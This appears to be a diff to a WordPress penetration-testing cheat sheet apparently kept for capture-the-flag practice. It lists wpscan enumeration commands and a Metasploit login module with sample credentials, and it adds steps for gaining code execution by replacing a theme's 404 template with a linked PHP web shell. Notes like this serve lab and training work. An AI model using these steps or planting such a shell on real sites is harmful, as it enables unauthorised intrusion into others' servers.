@@ -7,7 +7,7 @@ if it is a ctf, I would add th first 500 of rockyou.txt
 # Enumerate and Scan through wpscan
 wpscan --url http://example.com --enumerate --api-token <TOKENHERE>
 ;; or
- docker run -it --rm wpscanteam/wpscan  --url http://10.10.111.55  --enumerate --plugins-detection aggressive --api-token <TOKENHERE>
+docker run -it --rm wpscanteam/wpscan  --url http://10.10.111.55  --enumerate --plugins-detection aggressive --api-token <TOKENHERE>
 
 # Stealthier scan
 wpscan --stealthy --url myblog.com --enumerate --api-token <TOKENHERE>
@@ -46,3 +46,11 @@ set USERNAME usass
 set PASSWORD password123
 set RHOSTS example.com
 run
+
+# RCE from Admin Panel
+Modifying a php from the theme used (admin credentials needed)
+
+Appearance -> Editor -> 404 Template (at the right)
+Change the content for a php shell
+https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
+http://<IP>/wp-content/themes/twentytwelve/404.php
